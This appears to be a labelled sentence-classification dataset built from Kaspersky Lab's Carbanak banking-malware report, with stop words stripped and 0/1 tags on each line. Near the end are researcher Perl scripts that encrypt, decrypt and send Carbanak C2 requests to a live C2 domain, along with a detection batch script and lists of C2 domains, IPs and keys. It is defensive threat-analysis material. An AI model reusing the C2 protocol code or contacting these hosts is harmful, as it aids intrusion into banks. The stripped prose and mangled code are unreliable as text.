+Once vulnerability successfully exploited shellcode decrypts executes backdoor known Carbanak	0
+Carbanak remote backdoor ( initially based Carberp ) designed espionage data exfiltration provide remote access infected machines	1
+Once access achieved attackers perform manual reconnaissance victim 's networks	0
+Based results operation attackers use different lateral movement tools order get access critical systems victim infrastructure	0
+They install additional software Ammyy Remote Administration Tool even compromise SSH servers	1
+Notably latest versions analyzed Carbanak malware appear use Carberp source code	0
+Once attackers successfully compromise victim network primary internal destinations money processing services Automated Teller Machines ( ATM ) financial accounts	0
+In cases attackers used Society Worldwide Interbank Financial Telecommunication ( SWIFT ) network transfer money accounts	0
+In others Oracle databases manipulated open payment debit card accounts bank transfer money accounts using online banking system	0
+The ATM network also used dispense cash certain ATMs certain times money mules ready collect	0
+As part attack reconnaissance phase video recordings activities bank employees particularly system administrators made	1
+The videos sent C2 server	1
+Please note attackers abused aforementioned services impersonating legitimate local users permissions perform actions later reproduced cybercriminals	0
+As far know none aforementioned services attacked specific vulnerability within exploited	0
+Of 100 banking entities impacted time writing report least half suffered financial losses victims located Russia USA Germany China Ukraine	0
+The magnitude losses significant	0
+For example one victim lost approximately $ 7.3 million ( USD ) due ATM fraud ; another suffered $ 10 million ( USD ) loss due exploitation online banking platform	0
+Stolen funds transferred affected countries bank accounts US China	0
+Additionally C2 servers log entries indicating connections systems located US	0
+Telemetry indicates attackers expanding operations regions Asia Middle - East Africa Europe	0
+This report discusses attack vectors infection mechanisms toolkits used attackers exploit network initial infection well operational details geographical distribution campaign	0
+During spring 2014 Kaspersky Lab involved forensic analysis ATMs dispensing cash people located near physical interaction according security cameras	0
+No malware detected ATMs	0
+However Carberp - like malware found computer connected via VPN	0
+Following investigation incident summer 2014 Kaspersky Lab identified Carberp - like malware another investigation involving bank criminals able gain access online banking systems	0
+In investigation started analyzing computers bank 's infrastructure order find source infection	0
+We found spear phishing emails CPL files attached successful infection install Carberp - like malware previously found case involving ATMs	0
+There evidence indicating cases network compromised two four months many hundreds computers within single victim organization may infected	0
+This period time used attackers get access right victims critical systems learn operate tools systems get cash	0
+Carbanak contains espionage component allows attackers take control video capabilities victim systems	0
+Thanks long term observation reconnaissance could conducted	0
+This allowed attackers understand protocols daily operational tempo targets	0
+Based understanding exploitation methodologies mechanisms developed tailored victim	0
+All observed cases used spear phishing emails Microsoft Word 97 – 2003 ( .doc ) files attached CPL files	0
+The doc files exploit Microsoft Office ( CVE- 2012 - 0158 CVE-2013 - 3906 ) Microsoft Word ( CVE- 2014 - 1761 )	0
+There indicators point possible Chinese origin exploits used attachments	0
+Command Control ( C2 ) servers located China identified campaign	0
+In addition registration information domains use details supposedly Chinese citizens	0
+Obviously could red herring	0
+6 The targets employees affiliated affected institution	0
+The spear phishing email messages appeared legitimate cases sent compromised coworkers accounts	0
+In way compromised systems used transmission vector	0
+Given victims mostly Russian - speaking financial institutions names attachments identified generally Russian	0
+Examples include " Соответствие ФЗ-115 " " Приглашение " translate " Accordance Federal Law " " Invitation " respectively	0
+This enough induce typical employee open attachment execute malware	0
+For complete list file names see Appendix 4	0
+The following example Carbanak spear phishing email	0
+Translated	0
+In case attachment CPL file compressed using Roshal Archive ( .rar ) format	0
+Once remote code execution vulnerability successfully exploited installs Carbanak victim 's system	0
+The complete list observed spear phishing emails found Appendix 1 – Spear phishing	0
+An additional infection vector believe used criminals classical drive - - download attack	0
+We found traces Null RedKit exploits kits	0
+The image translates Country_name All visitors Unique visitors Banned visitor Revoked infections Infected	0
+Carbanak backdoor used attackers compromise victim 's machine exploit either spear phishing email exploit kit successfully executes payload	0
+This section provides functional analysis Carbanak 's capabilities	0
+Carbanak copies " % system32%\com " name " svchost.exe " file attributes system hidden read -	1
+The original file created exploit payload deleted	0
+To ensure Carbanak autorun privileges malware creates new service	1
+The naming syntax " ServiceName Sys " ServiceName existing service randomly chosen first character deleted	0
+For example existing service name " aspnet " visible name " Asp.net state service " service created malware would " aspnetSys " visible name " Sp.net state service "	0
+Before creating malicious service Carbanak determines either avp.exe avpui.exe processes ( components Kaspersky Internet Security ) running	1
+If found target system Carbanak try exploit known vulnerability Windows XP Windows Server 2003 Windows Vista Windows Server 2008 Windows 7 Windows 8 Windows Server 2012 CVE-2013 - 3660 local privilege escalation	0
+We believe relevant attackers adapt tools victim defenses	0
+Carbanak creates file random name .bin extension % COMMON_APPDATA%\Mozilla stores commands executed	1
+Then malware gets proxy configuration registry entry [ HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings ] Mozilla Firefox configuration file % AppData%\Mozilla\Firefox\<ProfileName>\prefs.js How detect Carbanak One best methods detecting Carbanak look .bin files folder .. \All users\%AppData%\Mozilla\ The malware saves files location later sent C2 server internet connection detected	1
+A .BAT script detecting infections provided Appendixes	0
+Additionally Carbanak obtain proxy configuration information headers sent application via SOCKS HTTP	1
+Carbanak injects code svchost.exe	1
+Most actions described happen within process	0
+Carbanak downloads file kldconfig.plug C2 server	1
+This file includes names processes monitored	0
+Once system infected Carbanak logs keystrokes takes screenshots every 20 seconds	1
+This monitoring performed intercepting ResumeThread call	0
+To enable connections infected computer using Remote Desktop Protocol ( RDP ) Carbanak sets Termservice service execution mode Auto	1
+Also executing service modifies executable code memory order establish simultaneous work processes remote local users	0
+Modules modified process termsrv.dll csrsrv.dll msgina.dll winlogon.exe	0
+If Carbanak detects banking application BLIZKO ( funds transfer software ) infected computer sends special notification C2 server	1
+Carbanak also aware IFOBS banking application command substitute details payment documents IFOBS system	0
+To communicate C2 server Carbanak uses HTTP protocol RC2+Base64 encryption adding additional characters included Base64	0
+It also inserts strings different extensions ( .gif,.htm etc ) random locations HTTP request	0
+Example typical Carbanak request	0
+Carbanak sends collected monitoring data C2 server	1
+It also receives commands	1
+The commands compared hash table ; match Carbanak performs associated action	0
+In order render malware less suspicious latest Carbanak samples digitally signed	0
+Known samples Carbanak uploaded VirusTotal following locations	0
+Known exploits download Carbanak uploaded VirusTotal mostly Russia	0
+According KSN data victims distributed geographically follows	0
+It also interesting see distribution Carbanak submissions VirusTotal	0
+This way identify periods malware came attention potential victims security researchers helps reveal peaks group 's activity	0
+Since beginning case Kaspersky Lab worked cooperation LEAs investigating	0
+During investigation LEAs shared us statistical data research helped us complete picture campaign	0
+The following map shows targets ' IP addresses found three Carbanak 's Linux servers end October 2014	0
+Carbanak uses different tools infected systems one different purpose	0
+There appears preference Ammyy Admin remote administration tool remote control	0
+Specifically attackers detected uploading Ammyy Admin 3.5 ( f8cd52b70a11a1fb3f29c6f89ff971ec ) svchost.exe It believed attackers used remote administration tool commonly whitelisted victims ' environments result used regularly administrators	0
+In another instance Secure Shell ( SSH ) backdoor used communicate C2 server 190.97.165.126 ( operatemesscont.net )	1
+This indicates attackers limit Microsoft Windows environments	0
+In case victim used Telnet / SSH client PuTTY connect server attackers recompiled machine 's SSH daemon backdoor could gain direct access	1
+Logs tools indicate accessed two different IPs probably used attackers located Ukraine France	0
+We also found traces many different tools used attackers inside victim network gain control additional systems Metasploit PsExec Mimikatz	0
+There appear four distinct types C2 servers	0
+Server rotation occurs less biweekly basis	0
+For complete list identified Carbanak servers please check regularly updated Carbanak IOC document	0
+The current list IOCs provided Appendix 3 document	0
+Some C2 servers responsible dropping Ammyy ( configuration executable files ) KLG plugin configuration ( list processes monitor ) VNC server ( 32 64 bits injected rundll )	0
+In one observed servers also Metasploit module	0
+Victim systems catalogued servers ' databases	0
+The victims belong number different communities thus simplifying administration	0
+In 85 different victims belonging seven communities found	0
+Additionally malicious servers contain video files capture victim activity	0
+While videos stored using compressed format provides poor image quality selected format minimizes upload bandwith sufficient quality attackers understand victims ' activities	0
+The video file naming conventions used name application foreground ( e.g. Outlook Cmd etc ) recorded user activity	0
+This helped attackers navigate files interest discard superfluous files	0
+Using intelligence gained video monitoring techniques attackers developed operational picture victim 's workflow tooling practices	0
+This picture helps attackers deploy malicious operations example	0
+In general attackers demonstrated great versatility using attack methodologies best suited specific victim 's operational methodology	0
+However seemed deliberately limit amount money stolen per victim $ 10 million USD	0
+This limit may explained maximum amount money transferred via mule services maximum amount money budgeted banks fraud risks order minimize chances LEAs bank anti - fraud teams full blown analysis	0
+Sensitive bank documents found servers controlling Carbanak	0
+They included classified emails manuals crypto keys passwords	0
+For example file figure KVC ( key verification codes ) keys used ATMs check integrity PIN numbers users	0
+In cases involving ATMs criminals able control computers access internal ATM network	0
+If bank enabled remote access ATMs criminals started using access remotely withdraw cash	0
+Criminals used malware operate ATM dispenser ; instead used standard utilities control test ATM equipment	0
+Malware targeting finance industry ( companies consumers ) continues evolve	0
+The Carbanak malware used - going campaign described report successful terms generating revenue	0
+Of particular interest attack methods similar used sophisticated cyber - espionage APTs	0
+As represent new disturbing trend cybercrime market increasing attack sophistication	0
+Despite increased awareness cybercrime within financial services sector appears spear phishing attacks old exploits ( patches disseminated ) remain effective larger companies	0
+Attackers always use minimal effort approach order bypass victim defenses	0
+Advanced control fraud detection systems used years financial services industry	0
+However focus fraudulent transactions within customer accounts	0
+The Carbanak attackers bypassed protections example using industry - wide funds transfer ( SWIFT network ) updating balances account holders using disbursement mechanisms ( ATM network )	0
+In neither cases attackers exploit vulnerability within service	0
+Instead studied victim internal procedures pinpointed impersonate locally order process fraudulent transactions aforementioned services	0
+It clear attackers familiar financial services software networks	0
+As part automated reconnaissance phase Carbanak malware checked victim systems presence specialized specific banking software	0
+Only presence banking systems confirmed victims exploited	0
+To date attacks approximately 300 IP addresses around world observed analyzed C2s	0
+It possible attacks coordinated maximize returns prior industry - wide information sharing implementation countermeasures	0
+Existing telemetry indicates Carbanak attackers trying expand operations Baltic Central Europe countries Middle East Asia Africa	0
+Carbanak may responsible losses high $ 1 billion USD	0
+We believe Carbanak campaign clear indicator new era cybercrime criminals use APT techniques directly financial industry instead customers	0
+APTs stealing information anymore	0
+Decryptor # /usr / bin / perl -w # Work Carbanak c2 use strict ; use warnings ; use Crypt::CBC ; use Crypt::Cipher::RC2 ; use MIME::Base64 ; use LWP::Simple ; # $ c2 = " worldnewsonline.pw " ; # $ reguest = " 1234567890123456 " ; $ reguest_was = " JybDHkfWGURJPuWeUpPMX / ca9BThbDim0Hdk/9YzkJS7m8a19tz QwZxo1vvQ / r/7SHJcCm4tdpZGp.dmDwKf MjpWBM18eX8VUiimyaUZMGoClZ6eShS9tLCK tuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4V fyUz.shtml " ; $ reguest_was = ~ tr/\/\=\&\?//d ; $ replace = " " ; $ find=".shtml " ; $ reguest_was = ~ s/\Q$find\E//g ; $ reguest_was = ~ s/-/+/g ; $ reguest_was = ~ s/\./\//g ; print " $ reguest_was\n " ; $ iv = substr $ reguest_was,0,8 ; $ reguest_was = substr $ reguest_was,8 ; $ base64_decoded1 = decode_base64("$reguest_was " ) ; print " $ base64_decoded1\n " ; $ length = length($base64_decoded1 ) ; print " length $ length\n " ; print " iv $ iv\n " ; print " req $ reguest_was\n " ; $ base64_decoded = " $ { base64_decoded1 } " ; $ key = " vfDGbiwmiqdN6E2N " ; # $ key = " 1234567812345678 " ; $ cipher = Crypt::CBC->new ( -cipher=>'Cipher::RC2 ' -header=>'none ' -literal_key=>1 -key=>$key – keysize=>16 -iv=>$iv ) ; $ plaintext = $ cipher->decrypt($base64_decoded ) ; print " Decode:\ n$plaintext\n " ; # Decrypt # HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data = listprocess|pro cess = svchost.exe|idproce ss=4294967295|lBHReFDRDfYG # $ url = " http://$c2/$base64_encoded " ; # print $ url ; # $ contents = get($url ) ; # print $ contents ; Encryptor # /usr / bin / perl -w # Decrypt Carbanak c2 responce use strict ; use warnings ; use Crypt::CBC ; use Crypt::Cipher::RC2 ; use MIME::Base64 ; use LWP::Simple ; $ c2 = " worldnewsonline.pw " ; $ reguest = " HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data = listprocess|pro cess = svchost.exe|idproces s=4294967295|lBHReFDRDfYG " ; $ iv = " JybDHkfW " ; # random $ key = " vfDGbiwmiqdN6E2N " ; $ cipher = Crypt::CBC->new ( -cipher=>'Cipher::RC2 ' -header=>'none ' -literal_key=>1 -key=>$key – keysize=>16 -iv=>$iv ) ; $ ciphertext = $ cipher->encrypt($reguest ) ; $ base64_encoded = encode_base64("$ciphertext " ) ; $ base64_encoded = ~ s/\x0a//g ; $ base64_encoded = ~ s/\//\./g ; $ base64_encoded = ~ s/\+/-/g ; $ base64_encoded_ex = " $ { iv}${base64_encoded}.php " ; $ url = " http://$c2/${base64_encoded_ex } " ; print $ url ; # http://worldnewsonline.pw/ GURJPuWeUpPMXca9BThbDim0Hdk9YzkJS7m8a19tzQwZxo1vvQr7SHJcCm4tdp ZGp	0
+dmDwKfMjpW.BM18eX8VUiimyaUZMGoClZ6eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHG ZCBPj.vd08D UENC5o AE4VfyUz .. php| $ contents = get($url ) ; print $ contents ; Decrypt Files CnC # /usr / bin / perl -w # Decrypt Files sended c2 use strict ; use warnings ; use Crypt::CBC ; use Crypt::Cipher::RC2 ; use MIME::Base64 ; use LWP::Simple ; $ file=$ARGV[0 ] ; open(DATA " $ file " ) ; open(DATA1 " $ file " ) ; open(DATA2 " $ file " ) ; binmode(DATA ) ; binmode(DATA1 ) ; binmode(DATA2 ) ; ( $ data $ n $ offset ) ; ( ( $ n = read DATA $ data 1 $ offset ) = 0 ) { $ offset + = $ n ; } $ length = $ offset ; $ iv_len = read DATA1 $ iv 8 0 ; read DATA2 $ crypt_data $ length 8 ; $ key = " vfDGbiwmiqdN6E2N " ; $ cipher = Crypt::CBC->new ( -cipher=>'Cipher::RC2 ' -header=>'none ' -literal_key=>1 -key=>$key – keysize=>16 -iv=>$iv ) ; $ plaintext = $ cipher->decrypt($crypt_data ) ; print " $ plaintext " ; @echo /f % % ( ' hostname ' ) set " name=%%a " echo % name% del /f % name%.log 2 nul exist " c:\Documents settings\All users\application data\ mozilla\*.bin " echo " BIN detected " % name%.log exist % SYSTEMROOT%\System32\com\svchost.exe echo " COM detected " % name%.log exist " c:\ProgramData\mozilla\*.bin " echo " BIN2 detected " % name%.log exist % SYSTEMROOT%\paexec * echo " Paexec detected " % name%.log exist % SYSTEMROOT%\Syswow64\com\svchost.exe echo " COM64 detected " % name%.log SC QUERY state= | find " SERVICE_NAME " | findstr " Sys$ " q%ERRORLEVEL% = = q0 SC QUERY state= | find " SERVICE_NAME " | findstr " Sys$ " % name%.log exist % name%.log echo Ok % name%.log xcopy /y % name%.log " \\<IP>\logVirus This section contains details spear phishing emails sent attackers infect victims	0
+MD5 8fa296efaf87ff4d9179283d42372c52 Name attachment Соответствие ФЗ- 115 от 24.06.2014г.doc Drops executable MD5 a1979aa159e0c54212122fd8acb24383 ( Carbanak ) Compiled Mon Apr 04 20:00:57 2011 ( Probably fake ) C2 update- java.net C2 key 1234567812345678 RDP 37.235.54.48:443 MD5 665b6cb31d962aefa3037b5849889e06 Name attachment Запрос.doc Drops executable MD5 4afafa81731f8f02ba1b58073b47abdf ( Carbanak ) Compiled Tue Jul 01 03:20:06 2014 Connects financialnewsonline.pw/FYocDxXpn5MXsHwZX/kLUAbd3w2/uUTsarcVKYk2W3B6hnc Z / Gafh8U1W805Lo0N / np7E3ICR6qx8keLDJZqUGXJKBDzfc6VYz9TNIlktObQ.htm ( 185.10.58.175 ) C2 financialnewsonline.pw financialwiki.pw C2 key TXeyuryWcIuzxkWnyu RDP 185.10.56.59:443 MD5 2c395f211db2d02cb544448729d0f081 Name attachment new.doc Drops executable MD5 551d41e2a4dd1497b3b27a91922d29cc ( Carbanak ) Compiled Mon Aug 04 01:10:40 2014 Connects http://worldnewsonline.pw/JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7 m8a19tzQwZxo1vvQ / r/7SHJcCm4tdpZGp.dmDwKfMjpWBM18eX8VUiimyaUZMGoClZ6 eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4VfyUz.shtml C2s worldnewsonline.pw worldnews24.pw C2 key JDvkyfhZxkMmDSwUkqvReIvC RDP 185.10.56.59:443 MD5 31e16189e9218cb131fdb13e75d0a94f Name attachment Анкета- Заявление.doc Drops executable MD5 4e107d20832fff89a41f04c4dff1739b ( Carbanak ) C2 public- dns.us C2 key 1234567812345678 RDP 37.235.54.48:443 MD5 db83e301564ff613dd1ca23c30a387f0 Name attachment Соответствие ФЗ- 115 от 21.07.2014г.doc Drops executable MD5 cb915d1bd7f21b29edc179092e967331 ( Carbanak ) Compiled Tue Apr 08 05:44:12 2014 Connects datsun- auto.com / bDqxEs / Ta6IPJq3zqmRY- .5/8SgGLA- F / I9CstBYT1rK7kx.440Sbtru.cgi?QVzF = tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD- Ucygbtzv4=f8fx MD5 f88a983fc0ef5bb446ae63250e7236dd Name attachment Приглашение.msg Drops executable MD5 3dc8c4af51c8c367fbe7c7feef4f6744 ( Carbanak ) Compiled Fri Aug 08 00:48:07 2014 C2s worldnewsonline.pw worldnews24.pw C2 key vfDGbiwmiqdN6E2N RDP 185.10.56.59:443 MD5 c4a6a111a070856c49905d815f87ab49 Name attachment ЧОСВЯЮООАГЖЦСЦЧОЧю Drops executable MD5 cb915d1bd7f21b29edc179092e967331 ( Carbanak ) Connects GET /cBAWFvkXi94QxShRTaVVn / YzAxD / X0sZEud.5gNItbvozI3tqT5ly9UYLVii13.bml?tlxCFi Busj=2OVj&9GP = a5houGz&K.F = T&l0.7FBN75=nMPDrlGXq4s7cIAQ0Cl662IwVjxvsiTOlG 0d0pd HTTP/1.1 Host datsun- auto.com MD5 86e48a9be62494bffb3b8e5ecb4a0310 Name attachment Приглашение.doc Drops executable MD5 3dc8c4af51c8c367fbe7c7feef4f6744 ( Carbanak ) Compiled Fri Aug 08 00:48:07 2014 MD5 6c7ac8dfd7bc5c2bb1a6d7aec488c298 Name attachment Соответствие ФЗ- 115 от 02.07.2014г .. doc Drops executable MD5 cb915d1bd7f21b29edc179092e967331 ( Carbanak ) Compiled Tue Apr 08 05:44:12 2014 Connects datsun- auto.com / bDqxEs / Ta6IPJq3zqmRY- .5/8SgGLA- F / I9CstBYT1rK7kx.440Sbtru.cgi?QVzF = tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD- Ucygbtzv4=f8fx 36 samples Securelist resource Follow us Kaspersky Lab experts ' technical research Academy Business Eugene SecureList ThreatPost Daily analysis thoughts	0
+Academy Business Eugene ThreatPost Daily Kaspersky Lab global Website Eugene Kaspersky Blog Daily Business Daily Kaspersky Lab B2C Blog Kaspersky Lab B2B Blog Academy Business ThreatPost Daily Academy Business Daily Kaspersky Lab security news service Kaspersky Lab Academy 39A/3 Leningradskoe Shosse Moscow 125212 Russian Federation contact details Tel + 7 - 495 - 797 - 8700 Fax + 7 - 495 - 797 - 8709	0
